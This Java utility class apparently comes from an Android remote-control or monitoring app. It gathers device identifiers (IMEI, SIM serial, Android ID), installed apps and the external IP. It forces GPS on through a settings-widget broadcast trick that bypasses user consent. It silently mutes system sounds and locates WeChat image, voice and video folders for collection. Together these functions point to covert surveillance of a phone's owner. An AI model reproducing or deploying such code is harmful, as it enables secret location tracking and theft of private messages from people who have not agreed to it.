package com.lfish.control.action.actiontool;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.lfish.control.ControlApplication;
import com.lfish.control.utils.MyLog;

public class Utils {


	public static final String DIR = "Android";
	public static final String PIC_DIR = "DCIM";
	public static final String SDPATH = GetExternalStoragePath() + "/";

	/**
	 * MD5
	 */
	public static String MD5(String plainText) {
		try {
			MessageDigest md = MessageDigest.getInstance("MD5");
			md.update(plainText.getBytes());
			byte b[] = md.digest();
			int i;
			StringBuffer buf = new StringBuffer("");
			for (int offset = 0; offset < b.length; offset++) {
				i = b[offset];
				if (i < 0)
					i += 256;
				if (i < 16)
					buf.append("0");
				buf.append(Integer.toHexString(i));
			}
			return buf.toString();
		} catch (NoSuchAlgorithmException e) {
			return null;
		}
	}

	/**
	 * Get Device unique ID
	 */
	public static String GetMyUUID() {
		final TelephonyManager tm = (TelephonyManager) ControlApplication.context.getSystemService(Context.TELEPHONY_SERVICE);
		final String tmDevice, tmSerial, androidId;
		tmDevice = "" + tm.getDeviceId();
		tmSerial = "" + tm.getSimSerialNumber();
		androidId = "" + android.provider.Settings.Secure.getString(ControlApplication.context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
		UUID deviceUuid = new UUID(androidId.hashCode(), ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode());
		String uniqueId = MD5(deviceUuid.toString()).substring(8, 24);
		return uniqueId;
	}

	/**
	 * Get Device IMEI
	 */
	public static String GetIMEI(Context context) {
		final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		final String tmDevice;
		tmDevice = "" + tm.getDeviceId();
		return tmDevice;
	}

	/**
	 * Get Device Installed app lists
	 */
	public static String GetInstalledAPPLists(Context context) {
		String strMessage = "";
		AppManager appInstalledManager = new AppManager(context);
		strMessage = appInstalledManager.GetInstallLists();
		return strMessage;
	}

	/**
	 * Get Device sdcard path
	 */
	public static String GetExternalStoragePath() {
		return Environment.getExternalStorageDirectory().getPath();
	}

	/**
	 * whether sdcard availed
	 */
	public static Boolean isSDCardPathAvailable(Context context) {

		Boolean isBoolean = false;
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
			File file = new File(SDPATH + DIR);
			if (!file.exists()) {
				file.mkdirs();
			}
			File file4 = new File(file, PIC_DIR);
			if (!file4.exists()) {
				file4.mkdirs();
			}
			isBoolean = true;
		}
		return isBoolean;
	}

	/**
	 * whether GPS open
	 *
	 * @param context
	 * @return true open
	 */
	public static final boolean isGPSOpen(final Context context) {
		LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		// GPS
		boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
		// NET
		boolean network = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
		if (gps || network) {
			return true;
		}

		return false;
	}

	/**
	 * openGPS
	 *
	 * @param context
	 */
	public static final void openGPS(Context context) {
		Intent GPSIntent = new Intent();
		GPSIntent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
		GPSIntent.addCategory("android.intent.category.ALTERNATIVE");
		GPSIntent.setData(Uri.parse("custom:3"));
		try {
			PendingIntent.getBroadcast(context, 0, GPSIntent, 0).send();
		} catch (CanceledException e) {
			e.printStackTrace();
		}
	}

	/**
	 * whether service is running
	 *
	 * @param mContext classname
	 * @return true isrun
	 */
	public static boolean ServiceRunStatus(Context mContext, String className) {
		boolean isRunning = false;
		ActivityManager activityManager = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningServiceInfo> serviceList = activityManager.getRunningServices(30);
		if (!(serviceList.size() > 0)) {
			return false;
		}
		for (int i = 0; i < serviceList.size(); i++) {
			if (serviceList.get(i).service.getClassName().equals(className) == true) {
				isRunning = true;
				break;
			}
		}
		return isRunning;
	}

	protected static boolean isNumeric(String str) {
		Pattern pattern = Pattern.compile("[0-9]*");
		return pattern.matcher(str).matches();
	}

	/**
	 * Get device local ip
	 */
	public static String getLocalIpAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress()) {
						return inetAddress.getHostAddress().toString();
					}
				}
			}
		} catch (SocketException ex) {
			Log.e("WifiPref IpAddress", ex.toString());
		}
		return null;
	}

	/**
	 * Get device out ip
	 */
	public static String GetOutIpAddress() {
		URL infoUrl = null;
		InputStream inStream = null;
		try {
			infoUrl = new URL("http://www.ip138.com/ips138.asp");
			URLConnection connection = infoUrl.openConnection();
			HttpURLConnection httpConnection = (HttpURLConnection) connection;
			int responseCode = httpConnection.getResponseCode();
			if (responseCode == HttpURLConnection.HTTP_OK) {
				inStream = httpConnection.getInputStream();
				BufferedReader reader = new BufferedReader(new InputStreamReader(inStream, "GBK"));
				StringBuilder strber = new StringBuilder();
				String line = null;
				while ((line = reader.readLine()) != null)
					strber.append(line + "\n");
				inStream.close();
				int search = strber.indexOf("您的IP地址是");
				int start = strber.indexOf("[",search);
				int end = strber.indexOf("]", start + 1);
				if (end > start + 1) {
					line = strber.substring(start + 1, end);
					return line;
				} else
					return "";
			}
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}




	/**
	 * Get device Current time yyyy_MM_dd_HH_mm_ss
	 */
	public static String getCurrentTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.getDefault());
		Date curDate = new Date(System.currentTimeMillis());

		String str = formatter.format(curDate);
		return str;
	}

	/**
	 * Set System Volumn
	 *
	 * @param context true mute false normal
	 */
	public static void systemVoice(Context context, boolean status) {
		AudioManager manager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		manager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
		int volumn = manager.getStreamVolume(AudioManager.STREAM_SYSTEM);
		if (volumn != 0 && status) {
			manager.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
			ShareUtils.putInt(context, ShareUtils.Config, ShareUtils.SystemVolume, volumn);
		} else if (!status) {
			int oldvolumn = ShareUtils.getInt(context, ShareUtils.Config, ShareUtils.SystemVolume, 0);
			manager.setStreamVolume(AudioManager.STREAM_SYSTEM, oldvolumn, AudioManager.FLAG_ALLOW_RINGER_MODES);
		}
	}

	/**
	 * 查找微信语音消息或视频消息或图片消息所在的目录
	 *
	 * @param path 父目录 如：/sdcard/tencent/MicroMsg/
	 * @param findDirName 要查找的子目录 如：image、voice、video
	 * @return
	 */
	public static String searchWeixinDirectory(String path, final String findDirName) {
		String filepath = null;
		File mainfile = new File(path);
		if (mainfile.exists()) {
			if (mainfile.isDirectory()) {
				File[] files = mainfile.listFiles();
				if (files != null && files.length > 0) {
					for (File file : files) {
						File[] fs = file.listFiles(new FileFilter() {
							@Override
							public boolean accept(File pathname) {
								String filename = pathname.getName();
								return filename.equals(findDirName);
							}
						});

						for (File f : fs) {
							if (f.isDirectory()) {
								filepath = f.getAbsolutePath() + File.separator;
							}
						}
					}
				}
			}
		}
		return filepath;
	}

//	public static byte[] msg2Bytes(Object message) {
//		IoBuffer buffer = (IoBuffer) message;
//		ByteBuffer bf = buffer.buf();
//		byte[] msgByte = new byte[bf.limit()];
//		bf.get(msgByte);
//		buffer.clear();
//		buffer.free();
//
//		StringBuffer sBuffer = new StringBuffer();
//		for (byte b : msgByte) {
//			sBuffer.append(b + " ");
//		}
//		return msgByte;
//	}
//	public static void sMessage(IoSession session,byte[] msg){
//		//IoSession session = Client.phonemap.get(key).getSession();
//		String str = null;
//
//		try {
//			
//			str = new String(msg,"utf-8");
//		} catch (UnsupportedEncodingException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//		StringBuffer sBuffer = new StringBuffer();
//		for(byte b : str.getBytes())
//		{
//			sBuffer.append(b+",");
//		}
//	//	System.out.println(sBuffer);
//		IoBuffer buffers = IoBuffer.allocate(msg.length);
//		
//
//		buffers.put(msg, 0, msg.length);
//		buffers.free();
//		buffers.flip();
//		session.write(buffers);
//	//	logger.info(write.isWritten());
//	}
}
